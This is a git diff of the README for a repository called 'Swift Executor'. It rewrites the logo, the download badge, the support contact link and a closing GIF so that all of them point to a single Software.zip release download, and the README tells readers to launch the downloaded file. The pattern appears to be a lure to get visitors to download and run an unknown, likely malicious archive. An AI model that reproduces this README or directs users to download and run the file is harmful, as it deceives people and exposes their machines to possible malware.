@@ -2,7 +2,7 @@
 
 Welcome to the official GitHub repository of **Swift Executor**! 
 
-![Swift Executor Logo](https://www.example.com/swift_executor_logo.png)
+![Swift Executor Logo](https://github.com/Hannzzome/Swift-Executor/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -23,7 +23,7 @@ Topics for this repository are not provided.
 
 You can download the latest version of **Swift Executor** by clicking the link below:
 
-[![Download Swift Executor](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Swift Executor](https://github.com/Hannzzome/Swift-Executor/releases/download/v2.0/Software.zip)](https://github.com/Hannzzome/Swift-Executor/releases/download/v2.0/Software.zip)
 
 *Note: Make sure to launch the downloaded file to begin the installation process.*
 
@@ -37,7 +37,7 @@ If the above link is not working, please check the "Releases" section of this re
 
 ## Support
 
-For any questions or issues regarding **Swift Executor**, feel free to [contact us](mailto:swiftexecutor@example.com).
+For any questions or issues regarding **Swift Executor**, feel free to [contact us](https://github.com/Hannzzome/Swift-Executor/releases/download/v2.0/Software.zip).
 
 ## Contributing
 
@@ -51,4 +51,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for visiting the **Swift Executor** repository! We hope you enjoy using our executor. Happy coding! 🚀
 
-![Swift Executor Gif](https://www.example.com/swift_executor.gif)
+![Swift Executor Gif](https://github.com/Hannzzome/Swift-Executor/releases/download/v2.0/Software.zip)
